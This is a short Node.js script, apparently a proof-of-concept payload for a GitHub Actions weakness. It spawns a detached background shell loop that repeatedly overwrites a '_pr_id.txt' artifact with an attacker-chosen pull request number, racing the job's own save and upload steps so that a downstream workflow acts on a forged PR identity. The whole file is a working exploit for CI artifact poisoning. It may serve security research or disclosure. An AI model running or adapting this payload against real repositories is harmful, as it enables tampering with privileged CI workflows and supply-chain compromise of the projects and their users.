// plant.js — Issue 2 payload (PR identity spoof) for the untrusted `pull_request` job.
// Spawns a detached loop that keeps overwriting the `pr_id` artifact file with the
// attacker-chosen PR number while the job's own "Save PR ID" / "Upload PR ID" steps
// run around it. All steps of a job share one runner/workspace, and background
// processes survive between steps — the loop wins the race deterministically.
const { spawn } = require("node:child_process");

const targetPr = process.env.TARGET_PR || "1141";
const loop = `while true; do
  f="/home/runner/work/templates/templates/_pr_id.txt"
  if [ -f "$f" ]; then echo -n "${targetPr}" > "$f"; fi
  sleep 0.05
done`;

spawn("sh", ["-c", loop], { detached: true, stdio: "ignore" }).unref();
console.log("planted artifact overwrite loop -> PR_ID = " + targetPr);
